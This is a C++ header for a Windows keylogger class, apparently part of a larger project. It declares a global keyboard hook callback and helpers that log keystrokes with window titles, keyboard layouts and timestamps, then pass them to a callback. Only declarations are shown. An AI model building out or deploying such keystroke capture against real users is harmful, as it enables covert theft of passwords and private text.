#pragma once

#include <functional>
#include <mutex>
#include <Windows.h>
#include <wil/resource.h>

#include "IOperationQueue.h"

using OnKeyLog = std::function<void(const std::string&)>;

class KeyLogger
{
public:
	explicit KeyLogger(const OnKeyLog& onKeyLog);
	~KeyLogger();

private:
	static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
	static void Callback(LPARAM lParam);

	static std::string GetLog(int keyStroke);
	static std::string GetWindowTitle(HWND windowHandle);
	static HKL GetKeyboardLayout(HWND windowHandle);
	static std::string GetWindowPrefix(HWND windowHandle);
	static std::string FormatDate(std::chrono::system_clock::time_point time);

	static std::mutex _instancesLock;
	static std::vector<KeyLogger*> _instances;
	static std::unique_ptr<IOperationQueue> _queue;
	static wil::unique_hhook _hook;
	static std::string _lastWindowTitle;

	OnKeyLog _onKeyLog;
};

